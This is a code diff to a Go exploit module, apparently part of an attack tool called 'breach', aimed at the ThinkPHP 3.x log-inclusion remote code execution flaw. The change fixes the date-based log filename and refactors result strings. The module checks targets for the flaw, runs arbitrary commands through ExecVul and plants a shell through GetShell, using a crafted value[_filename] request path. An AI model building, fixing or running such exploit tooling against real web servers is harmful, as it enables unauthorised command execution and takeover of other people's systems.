@@ -2,6 +2,7 @@ package thinkphp
 
 import (
 	"breach/internal/util"
+	"fmt"
 	"io"
 	"net/http"
 	"strings"
@@ -18,10 +19,10 @@ type TP3LogRceModule struct {
 
 func NewTP3LogRceModule(baseUrl string) *TP3LogRceModule {
 	now := time.Now()
-	year := string(rune(now.Year()))
-	month := string(rune(now.Month()))
-	day := string(rune(now.Day()))
-	suffix1 := year[2:4] + "_" + month + "_" + day + "_" + ".log"
+	year := now.Year()
+	month := now.Month()
+	day := now.Day()
+	suffix1 := fmt.Sprintf("%d_%02d_%02d.log", year, month, day)
 	checkVulPayloadUrl := make([]string, 0)
 	p := []string{
 		"/?m=Home&c=Index&a=index&value[_filename]=." + "/Application/Runtime/Logs/Home/",
@@ -66,7 +67,7 @@ func (t *TP3LogRceModule) CheckVul() *util.Response {
 			return util.Fail(err.Error())
 		}
 		if strings.Contains(string(bytes), t.checkStr) {
-			return util.Success("ThinkPHP 3.x Log RCE", payloadUrl)
+			return util.Success(t.feature, payloadUrl)
 		}
 	}
 	return util.Fail("no vulnerable")
@@ -84,7 +85,7 @@ func (t *TP3LogRceModule) ExecVul(cmd string) *util.Response {
 		return util.Fail(err.Error())
 	}
 	if resp.StatusCode == 200 {
-		return util.Success("ThinkPHP 3.x Log RCE", logRes)
+		return util.Success(t.feature, logRes)
 	}
 	return util.Fail("no vulnerable")
 }
@@ -101,7 +102,7 @@ func (t *TP3LogRceModule) GetShell() *util.Response {
 		return util.Fail(err.Error())
 	}
 	if resp.StatusCode == 200 {
-		return util.Success("ThinkPHP 3.x Log RCE", logRes)
+		return util.Success(t.feature, logRes)
 	}
 	return util.Fail("no vulnerable")
 }
